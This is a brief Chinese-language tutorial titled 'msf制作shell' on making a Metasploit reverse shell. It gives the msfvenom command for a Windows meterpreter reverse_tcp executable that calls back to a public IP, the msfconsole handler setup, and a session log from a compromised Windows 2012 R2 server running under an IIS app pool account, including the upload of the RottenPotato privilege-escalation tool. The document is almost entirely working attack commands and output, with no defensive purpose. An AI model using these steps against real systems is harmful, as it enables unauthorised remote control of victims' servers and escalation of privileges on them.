# msf制作shell


#### 1 .制作反弹shell-exe文件

执行命令
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2x.94.50.153 LPORT=4433 -f exe -o 4433.exe

```
> `LHOST`为公网IP

> `LPORT`为反弹端口

> `4433.exe`为生成文件

##### 2.控制端启动msfconsole，获取监听

运行命令

```
msfconsle
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 2xx.94.50.153
msf5 exploit(multi/handler) > set LPORT 4433
msf5 exploit(multi/handler) > run


```

##### 3.反弹成功

```
meterpreter > sysinfo
Computer        : WIN-UKKED2CCSHJ
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows

meterpreter > getuid
Server username: IIS APPPOOL\padt002

#上传文件
meterpreter > upload /root/RottenPotato/rottenpotato.exe
[*] uploading  : /root/RottenPotato/rottenpotato.exe -> rottenpotato.exe
[*] Uploaded 664.00 KiB of 664.00 KiB (100.0%): /root/RottenPotato/rottenpotato.exe -> rottenpotato.exe
[*] uploaded   : /root/RottenPotato/rottenpotato.exe -> rottenpotato.exe

```

